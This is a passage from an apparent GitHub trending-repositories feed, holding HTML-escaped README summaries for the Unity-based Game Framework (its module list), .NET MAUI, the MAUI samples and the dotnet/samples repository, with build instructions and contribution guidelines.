&#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;数据表 (Data Table)&lt;/strong&gt; - 可以将游戏数据以表格（如 Microsoft Excel）的形式进行配置后，使用此模块使用这些数据表。数据表的格式是可以自定义的。&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;调试器 (Debugger)&lt;/strong&gt; - 当游戏在 Unity 编辑器中运行或者以 Development 方式发布运行时，将出现调试器窗口，便于查看运行时日志、调试信息等。用户还可以方便地将自己的功能注册到调试器窗口上并使用。&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;下载 (Download)&lt;/strong&gt; - 提供下载文件的功能，支持断点续传，并可指定允许几个下载器进行同时下载。更新资源时会主动调用此模块。&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;实体 (Entity)&lt;/strong&gt; - 我们将游戏场景中，动态创建的一切物体定义为实体。此模块提供管理实体和实体组的功能，如显示隐藏实体、挂接实体（如挂接武器、坐骑，或者抓起另一个实体）等。实体使用结束后可以不立刻销毁，从而等待下一次重新使用。&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;事件 (Event)&lt;/strong&gt; - 游戏逻辑监听、抛出事件的机制。Game Framework 中的很多模块在完成操作后都会抛出内置事件，监听这些事件将大大解除游戏逻辑之间的耦合。用户也可以定义自己的游戏逻辑事件。&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;文件系统 (File System)&lt;/strong&gt; - 虚拟文件系统使用类似磁盘的概念对零散文件进行集中管理，优化资源加载时产生的内存分配，甚至可以对资源进行局部片段加载，这些都将极大提升资源加载时的性能。&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;有限状态机 (FSM)&lt;/strong&gt; - 提供创建、使用和销毁有限状态机的功能，一些适用于有限状态机机制的游戏逻辑，使用此模块将是一个不错的选择。&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;本地化 (Localization)&lt;/strong&gt; - 提供本地化功能，也就是我们平时所说的多语言。Game Framework 在本地化方面，不但支持文本的本地化，还支持任意资源的本地化，比如游戏中释放烟花特效也可以做出几个多国语言的版本，使得中文版里是“新年好”字样的特效，而英文版里是“Happy New Year”字样的特效。&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;网络 (Network)&lt;/strong&gt; - 提供使用 Socket 长连接的功能，当前我们支持 TCP 协议，同时兼容 IPv4 和 IPv6 两个版本。用户可以同时建立多个连接与多个服务器同时进行通信，比如除了连接常规的游戏服务器，还可以连接语音聊天服务器。如果想接入 ProtoBuf 之类的协议库，只要派生自 Packet 类并实现自己的消息包类即可使用。&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;对象池 (Object Pool)&lt;/strong&gt; - 提供对象缓存池的功能，避免频繁地创建和销毁各种游戏对象，提高游戏性能。除了 Game Framework 自身使用了对象池，用户还可以很方便地创建和管理自己的对象池。&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;流程 (Procedure)&lt;/strong&gt; - 是贯穿游戏运行时整个生命周期的有限状态机。通过流程，将不同的游戏状态进行解耦将是一个非常好的习惯。对于网络游戏，你可能需要如检查资源流程、更新资源流程、检查服务器列表流程、选择服务器流程、登录服务器流程、创建角色流程等流程，而对于单机游戏，你可能需要在游戏选择菜单流程和游戏实际玩法流程之间做切换。如果想增加流程，只要派生自 ProcedureBase 类并实现自己的流程类即可使用。&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;资源 (Resource)&lt;/strong&gt; - 为了保证玩家的体验，我们不推荐再使用同步的方式加载资源，由于 Game Framework 自身使用了一套完整的异步加载资源体系，因此只提供了异步加载资源的接口。不论简单的数据表、本地化字典，还是复杂的实体、场景、界面，我们都将使用异步加载。同时，Game Framework 提供了默认的内存管理策略（当然，你也可以定义自己的内存管理策略）。多数情况下，在使用 GameObject 的过程中，你甚至可以不需要自行进行 Instantiate 或者是 Destroy 操作。&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;场景 (Scene)&lt;/strong&gt; - 提供场景管理的功能，可以同时加载多个场景，也可以随时卸载任何一个场景，从而很容易地实现场景的分部加载。&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;配置 (Setting)&lt;/strong&gt; - 以键值对的形式存储玩家数据，对 UnityEngine.PlayerPrefs 进行封装，也可以将这些数据直接存储在磁盘上。&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;声音 (Sound)&lt;/strong&gt; - 提供管理声音和声音组的功能，用户可以自定义一个声音的音量、是 2D 声音还是 3D 声音，甚至是直接绑定到某个实体上跟随实体移动。&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;界面 (UI)&lt;/strong&gt; - 提供管理界面和界面组的功能，如显示隐藏界面、激活界面、改变界面层级等。不论是 Unity 内置的 uGUI 还是其它类型的 UI 插件（如 NGUI），只要派生自 UIFormLogic 类并实现自己的界面类即可使用。界面使用结束后可以不立刻销毁，从而等待下一次重新使用。&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Web 请求 (Web Request)&lt;/strong&gt; - 提供使用短连接的功能，可以用 Get 或者 Post 方法向服务器发送请求并获取响应数据，可指定允许几个 Web 请求器进行同时请求。&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;hr&gt; &#xA;&lt;h2&gt;INTRODUCTION&lt;/h2&gt; &#xA;&lt;p&gt;Game Framework is literally a game framework, based on Unity game engine. It encapsulates commonly used game modules during development, and, to a large degree, standardises the process, enhances the development speed and ensures the product quality.&lt;/p&gt; &#xA;&lt;p&gt;Game Framework provides the following 19 builtin modules, and more will be developed later for game developers to use.&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Config&lt;/strong&gt; - saves some global read-only game configurations, such as the player&#39;s initial speed, the initial volume of the game, etc.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Data Node&lt;/strong&gt; - saves arbitrary types of data within tree structures in order to manage various data during game runtime.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Data Table&lt;/strong&gt; - is intended to invoke game data in the form of pre-configured tables (such as Microsoft Excel sheets). The format of the tables can be customised.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Debugger&lt;/strong&gt; - displays a debugger window when the game runs in the Unity Editor or in a development build, to facilitate the viewing of runtime logs and debug messages. The user can register their own features to the debugger windows and use them conveniently.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Download&lt;/strong&gt; - provides the ability to download files. The user is free to set how many downloaders could be used simultaneously.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Entity&lt;/strong&gt; - provides the ability to manage entities and groups of entities, where an entity is defined as any dynamically created objects in the game scene. It shows or hides entities, attach one entity to another (such as weapons, horses or snatching up another entity). Entities could avoid being destroyed instantly after use, and hence be recycled for reuse.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Event&lt;/strong&gt; - gives the mechanism for the game logic to fire or observe events. Many modules in the Game Framework fires events after operations, and observing these events will largely decouple game logic modules. The user can define his own game logic events, too.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;File System&lt;/strong&gt; - the virtual file system, based on the concept of disks, manages scattered files in a centralized way, optimizes memory allocation when resources are loaded, and can even load segments of resources. These will drastically enhance the performance of resource loading.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;FSM&lt;/strong&gt; - provides the ability to create, use and destroy finite state machines. It’d be a good choice to use this module for some state-machine-like game logic.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Localization&lt;/strong&gt; - provides the ability to localise the game. Game Framework not only supports the localisation of texts, but also assets of all kinds. For example, a firework effect in the game can be localised as various versions, so that the player will see a &#34;新年好&#34; - like effect in the Chinese version, while &#34;Happy New Year&#34; - like in the English version.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Network&lt;/strong&gt; - provides socket connections where TCP is currently supported and both IPv4 and IPv6 are valid. The user can establish several connections to different servers at the same time. For example, the user can connect to a normal game server, and another server for voice chat. The &#39;Packet&#39; class is ready for inheritance and implemented if the user wants to take use of protocol libraries such as ProtoBuf.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Object Pool&lt;/strong&gt; - provides the ability to cache objects in pools. It avoids frequent creation and destruction operations of game objects, and hence improves the game performance. Game Framework itself uses object pools, and the user could conveniently create and manage his own pools.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Procedure&lt;/strong&gt; - is in fact an FSM of the whole lifecycle of the game. It’d be a very good habit to decouple different game states via procedures. For a network game, you probably need procedures of checking resources, updating resources, checking the server list, selecting a server, logging in a server and creating avatars. For a standalone game, you perhaps need to switch between procedures of the menu and the real gameplay. The user could add procedures by simply subclassing and implementing the &#39;ProcedureBase&#39; class.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Resource&lt;/strong&gt; - provides only asynchronous interfaces to load resources. We don’t recommend synchronous approaches for better play experience, and Game Framework itself uses a complete system of asynchronous resource loading. We load everything asynchronously, including simple things like data tables and localisation texts, and complex things like entities, scenes and UIs. Meanwhile, Game Framework provides default strategies of memory management (and of course, you could define your own strategies). In most cases, you don&#39;t even need to call &#39;Instantiate&#39; or &#39;Destroy&#39; when using &#39;GameObject&#39; instances.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Scene&lt;/strong&gt; - provides features to manage scenes. It supports simultaneous loading of multiple scenes, and the user is allowed to unload a scene at any time. Therefore partial loading/unloading of scenes could be easily implemented.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Setting&lt;/strong&gt; - stores player data in key-value pairs by either encapsulating UnityEngine.PlayerPrefs or by saving the data directly to the disk.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Sound&lt;/strong&gt; - provides features to manage sounds and groups of sounds. The user could set the properties of an audio clip, such as the volume, whether the clip is 2D or 3D, and could even bind the clip to some entity to follow its position.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;UI&lt;/strong&gt; - provides features to manage user interfaces and groups of UIs, such as showing or hiding, activating or deactivating, and depth changing. No matter the user uses the builtin uGUI in Unity or other UI plugins (NGUI, for example), he only needs to subclass &#39;UIFormLogic&#39; and implement his own UI logic. The UIs could avoid being destroyed instantly after use, and hence be recycled for reuse.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Web Request&lt;/strong&gt; - provides features of short connections, supports GET and POST methods to send requests to the server and acquire the response data, and allows the user to send simultaneous requests to different servers.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ol&gt;</summary>
  </entry>
  <entry>
    <title>dotnet/maui</title>
    <updated>2022-05-29T01:36:31Z</updated>
    <id>tag:github.com,2022-05-29:/dotnet/maui</id>
    <link href="https://github.com/dotnet/maui" rel="alternate"></link>
    <summary type="html">&lt;p&gt;.NET MAUI is the .NET Multi-platform App UI, a framework for building native device applications spanning mobile, tablet, and desktop.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;.NET Multi-platform App UI (.NET MAUI)&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://dev.azure.com/xamarin/public/_build/latest?definitionId=57&amp;amp;repoName=dotnet%2Fmaui&amp;amp;branchName=main&#34;&gt;&lt;img src=&#34;https://dev.azure.com/xamarin/public/_apis/build/status/MAUI-public?repoName=dotnet%2Fmaui&amp;amp;branchName=main&amp;amp;label=Public&#34; alt=&#34;Build Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://devdiv.visualstudio.com/DevDiv/_build/latest?definitionId=13330&amp;amp;repoName=dotnet%2Fmaui&amp;amp;branchName=main&#34;&gt;&lt;img src=&#34;https://devdiv.visualstudio.com/DevDiv/_apis/build/status/MAUI?repoName=dotnet%2Fmaui&amp;amp;branchName=main&amp;amp;label=Private&#34; alt=&#34;Build Status&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://dotnet.microsoft.com/en-us/apps/maui&#34;&gt;.NET Multi-platform App UI (.NET MAUI)&lt;/a&gt; is a cross-platform framework for creating mobile and desktop apps with C# and XAML. Using .NET MAUI, you can develop apps that can run on Android, iOS, iPadOS, macOS, and Windows from a single shared codebase.&lt;/p&gt; &#xA;&lt;h2&gt;Getting Started&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://dot.net/maui&#34;&gt;Install .NET MAUI&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/dotnet/maui&#34;&gt;.NET MAUI Documentation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/dotnet/maui-samples&#34;&gt;.NET MAUI Samples&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/dotnet/maui/main/.github/DEVELOPMENT.md&#34;&gt;Development Guide&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Overview&lt;/h2&gt; &#xA;&lt;p&gt;.NET Multi-platform App UI (.NET MAUI) is the evolution of Xamarin.Forms that expands capabilities beyond mobile Android and iOS into desktop apps for Windows and macOS. With .NET MAUI, you can build apps that perform great for any device that runs Windows, macOS, Android, &amp;amp; iOS from a single codebase. Coupled with Visual Studio productivity tools and emulators, .NET and Visual Studio significantly speed up the development process for building apps that target the widest possible set of devices. Use a single development stack that supports the best of breed solutions for all modern workloads with a unified SDK, base class libraries, and toolchain. &lt;a href=&#34;https://docs.microsoft.com/dotnet/maui/what-is-maui&#34;&gt;Read More&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/dotnet/maui/main/Assets/maui-weather-hero-sm.png&#34; alt=&#34;.NET MAUI Weather App on all platforms&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Current News&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;May 10, 2022 - &lt;a href=&#34;https://devblogs.microsoft.com/dotnet/dotnet-maui-rc-3/&#34;&gt;.NET MAUI Release Candidate 3&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;April 26, 2022 - &lt;a href=&#34;https://devblogs.microsoft.com/dotnet/dotnet-maui-rc-2/&#34;&gt;.NET MAUI Release Candidate 2&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;April 12, 2022 - &lt;a href=&#34;https://devblogs.microsoft.com/dotnet/dotnet-maui-rc-1/&#34;&gt;.NET MAUI Release Candidate - Ready for Cross-Platform App Development&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Follow the &lt;a href=&#34;https://devblogs.microsoft.com/dotnet/category/net-maui/&#34;&gt;.NET MAUI Blog&lt;/a&gt; and visit the &lt;a href=&#34;https://github.com/dotnet/maui/wiki/News&#34;&gt;News&lt;/a&gt; wiki page for more news and updates.&lt;/p&gt; &#xA;&lt;h2&gt;FAQs&lt;/h2&gt; &#xA;&lt;p&gt;Do you have questions? Do not worry, we have prepared a complete &lt;a href=&#34;https://github.com/dotnet/maui/wiki/FAQs&#34;&gt;FAQ&lt;/a&gt; answering the most common questions.&lt;/p&gt; &#xA;&lt;h2&gt;How to Engage, Contribute, and Give Feedback&lt;/h2&gt; &#xA;&lt;p&gt;Some of the best ways to &lt;a href=&#34;https://raw.githubusercontent.com/dotnet/maui/main/.github/CONTRIBUTING.md&#34;&gt;contribute&lt;/a&gt; are to try things out, file issues, join in design conversations, and make pull-requests. Proposals for changes specific to MAUI can be found &lt;a href=&#34;https://github.com/dotnet/maui/issues&#34;&gt;here for discussion&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://raw.githubusercontent.com/dotnet/maui/main/.github/CONTRIBUTING.md&#34;&gt;CONTRIBUTING&lt;/a&gt;, &lt;a href=&#34;https://raw.githubusercontent.com/dotnet/maui/main/.github/CODE_OF_CONDUCT.md&#34;&gt;CODE-OF-CONDUCT&lt;/a&gt; and the &lt;a href=&#34;https://raw.githubusercontent.com/dotnet/maui/main/.github/DEVELOPMENT.md&#34;&gt;Development Guide&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>dotnet/maui-samples</title>
    <updated>2022-05-29T01:36:31Z</updated>
    <id>tag:github.com,2022-05-29:/dotnet/maui-samples</id>
    <link href="https://github.com/dotnet/maui-samples" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Samples for .NET Multi-Platform App UI (.NET MAUI)&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;.NET MAUI Samples&lt;/h1&gt; &#xA;&lt;p&gt;Samples built with .NET Multi-platform App UI (.NET MAUI).&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://dot.net/maui&#34;&gt;.NET MAUI&lt;/a&gt; is a cross-platform framework for creating mobile and desktop apps with C# and XAML. Using .NET MAUI, you can develop apps that can run on Android, iOS, iPadOS, macOS, and Windows from a single shared codebase.&lt;/p&gt; &#xA;&lt;h2&gt;Official Samples&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/dotnet/maui-samples/main/6.0/Apps/WeatherTwentyOne&#34;&gt;Weather &#39;21 App&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/dotnet/maui-samples/main/6.0/Apps/Calculator&#34;&gt;Calculator App&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/microsoft/dotnet-podcasts&#34;&gt;.NET Podcasts App&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/dotnet/maui-samples/main/6.0/Navigation&#34;&gt;Navigation Samples&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/dotnet/maui-samples/main/6.0/Beginners-Series&#34;&gt;Beginner&#39;s Series Task App Sample&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Community Samples&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/rachelkang/recipeSearch&#34;&gt;Rachel&#39;s Recipes App&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/jsuarezruiz/awesome-dotnet-maui&#34;&gt;Awesome .NET MAUI&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;.NET MAUI Links&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://dot.net/maui&#34;&gt;.NET MAUI Website&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/dotnet/maui&#34;&gt;.NET MAUI Documentation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://devblogs.microsoft.com/dotnet/category/maui/&#34;&gt;.NET MAUI Blog&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/dotnet/maui&#34;&gt;.NET MAUI GitHub&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;.NET Foundation&lt;/h2&gt; &#xA;&lt;p&gt;There are many .NET related projects on GitHub.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Microsoft/dotnet&#34;&gt;.NET home repo&lt;/a&gt; - links to hundreds of .NET projects, from Microsoft and the community.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/aspnet/core/&#34;&gt;ASP.NET Core home&lt;/a&gt; - the best place to start learning about ASP.NET Core.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;This project has adopted the code of conduct defined by the &lt;a href=&#34;http://contributor-covenant.org/&#34;&gt;Contributor Covenant&lt;/a&gt; to clarify expected behavior in our community. For more information, see the &lt;a href=&#34;http://www.dotnetfoundation.org/code-of-conduct&#34;&gt;.NET Foundation Code of Conduct&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;.NET (including the maui-samples repo) is licensed under the &lt;a href=&#34;https://raw.githubusercontent.com/dotnet/maui-samples/main/LICENSE&#34;&gt;MIT&lt;/a&gt; license.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>dotnet/samples</title>
    <updated>2022-05-29T01:36:31Z</updated>
    <id>tag:github.com,2022-05-29:/dotnet/samples</id>
    <link href="https://github.com/dotnet/samples" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Sample code referenced by the .NET documentation&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;.NET Samples&lt;/h1&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/dotnet/samples/workflows/Markdownlint/badge.svg?sanitize=true&#34; alt=&#34;Markdownlint&#34;&gt; &lt;a href=&#34;https://github.com/dotnet/samples/actions/workflows/build-validation.yml&#34;&gt;&lt;img src=&#34;https://github.com/dotnet/samples/actions/workflows/build-validation.yml/badge.svg?sanitize=true&#34; alt=&#34;Snippets 5000&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/dotnet/samples/actions/workflows/version-sweep.yml&#34;&gt;&lt;img src=&#34;https://github.com/dotnet/samples/actions/workflows/version-sweep.yml/badge.svg?sanitize=true&#34; alt=&#34;target supported version&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;This repo contains all the sample code that is part of any topic under the .NET documentation. There are several different projects that are organized in sub-folders. These sub-folders are organized similarly to the organization of the docs for .NET. Some of the articles will have more than one sample associated with them.&lt;/p&gt; &#xA;&lt;p&gt;The content team tracks issues for .NET documentation in the &lt;a href=&#34;https://github.com/dotnet/docs&#34;&gt;dotnet/docs&lt;/a&gt; and &lt;a href=&#34;https://github.com/dotnet/dotnet-api-docs&#34;&gt;dotnet/dotnet-api-docs&lt;/a&gt; repositories. Issues are turned off on this repository. File issues against existing samples and suggestions for new samples in those repositories. If you&#39;re not sure where, choose &lt;a href=&#34;https://github.com/dotnet/docs/issues&#34;&gt;dotnet/docs&lt;/a&gt;. This process keeps the issues associated with the articles that explain the concepts for each sample. The best process is to file an issue from the feedback control at the bottom of each docs page:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;For existing samples, file the issue on the page with the sample.&lt;/li&gt; &#xA; &lt;li&gt;To suggest new samples, file the issue on the index page where you want to see the new sample.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;The code in this repository represents programs that demonstrate application or library scenarios. These samples often use more than one technology, feature, or toolkit. Each sample has a readme.md file that explains the sample and links to resources for more information.&lt;/p&gt; &#xA;&lt;p&gt;Samples should be buildable projects. Those projects should build and run on the widest set of platforms possible for the given sample. In practice, that means building .NET Core-based console applications where possible. Samples that are specific to the web or a UI framework should add those tools as needed. Examples include web applications, mobile apps, WPF or WinForms apps, and so on.&lt;/p&gt; &#xA;&lt;p&gt;We are working toward having a CI system in place for all code. When you make any updates to samples, make sure each update is part of a buildable project. Ideally, add tests for correctness on samples as well.&lt;/p&gt; &#xA;&lt;h2&gt;Building a sample&lt;/h2&gt; &#xA;&lt;p&gt;Build any .NET Core sample using the .NET Core CLI, which is installed with &lt;a href=&#34;https://www.microsoft.com/net/download&#34;&gt;the .NET Core SDK&lt;/a&gt;. Then run these commands from the CLI in the directory of any sample:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;dotnet build&#xA;dotnet run&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;These will install any needed dependencies, build the project, and run the project respectively.&lt;/p&gt; &#xA;&lt;p&gt;Multi-project samples have instructions in their root directory in a &lt;code&gt;README.md&lt;/code&gt; file.&lt;/p&gt; &#xA;&lt;p&gt;Except where noted, all samples build from the command line on any platform supported by .NET Core. There are a few samples that are specific to Visual Studio and require Visual Studio 2017 or later. In addition, some samples show platform-specific features and will require a specific platform. Other samples and snippets require the .NET Framework and will run on Windows platforms, and will need the Developer Pack for the target Framework version.&lt;/p&gt; &#xA;&lt;h2&gt;Creating new samples&lt;/h2&gt; &#xA;&lt;p&gt;If you wish to add a code sample:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt; &lt;p&gt;Your sample &lt;strong&gt;must be part of a buildable project&lt;/strong&gt;. Where possible, the projects should build on all platforms supported by .NET Core. Exceptions to this are samples that demonstrate a platform-specific feature or platform-specific tool.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Your sample should conform to the &lt;a href=&#34;https://github.com/dotnet/runtime/raw/main/docs/coding-guidelines/coding-style.md&#34;&gt;runtime coding style&lt;/a&gt; to maintain consistency.&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Additionally, we prefer the use of &lt;code&gt;static&lt;/code&gt; methods rather than instance methods when demonstrating something that doesn&#39;t require instantiating a new object.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Your sample should include &lt;strong&gt;appropriate exception handling&lt;/strong&gt;. It should handle all exceptions that are likely to be thrown in the context of the sample. For example, a sample that calls the &lt;a href=&#34;https://docs.microsoft.com/dotnet/api/system.console.readline&#34;&gt;Console.ReadLine&lt;/a&gt; method to retrieve user input should use appropriate exception handling when the input string is passed as an argument to a method. Similarly, if your sample expects a method call to fail, the resulting exception must be handled. Always handle the specific exceptions thrown by the method, rather than base class exceptions such as &lt;a href=&#34;https://docs.microsoft.com/dotnet/api/system.exception&#34;&gt;Exception&lt;/a&gt; or &lt;a href=&#34;https://docs.microsoft.com/dotnet/api/system.systemexception&#34;&gt;SystemException&lt;/a&gt;.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;If your sample builds a standalone package, you must include the runtimes used by our CI build system, in addition to any runtimes used by your sample:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;win7-x64&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;win8-x64&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;win81-x64&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;ubuntu.16.04-x64&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;We will have a CI system in place to build these projects shortly.&lt;/p&gt; &#xA;&lt;p&gt;To create a sample:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt; &lt;p&gt;File an &lt;a href=&#34;https://github.com/dotnet/docs/issues&#34;&gt;issue&lt;/a&gt; or add a comment to an existing one that you are working on it.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Write the topic that explains the concepts demonstrated in your sample (example: &lt;code&gt;docs/standard/linq/where-clause.md&lt;/code&gt;).&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Write your sample (example: &lt;em&gt;WhereClause-Sample1.cs&lt;/em&gt;).&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Create a &lt;em&gt;Program.cs&lt;/em&gt; with a Main entry point that calls your samples. If there is already one there, add the call to your sample:&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;public class Program&#xA;{&#xA;    public void Main(string[] args)&#xA;    {&#xA;        WhereClause1.QuerySyntaxExample();&#xA;&#xA;        // Add the method syntax as an example.&#xA;        WhereClause1.MethodSyntaxExample();&#xA;    }&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Don&#39;t check in the solution file if it contains only one project.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;To build and run your sample:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt; 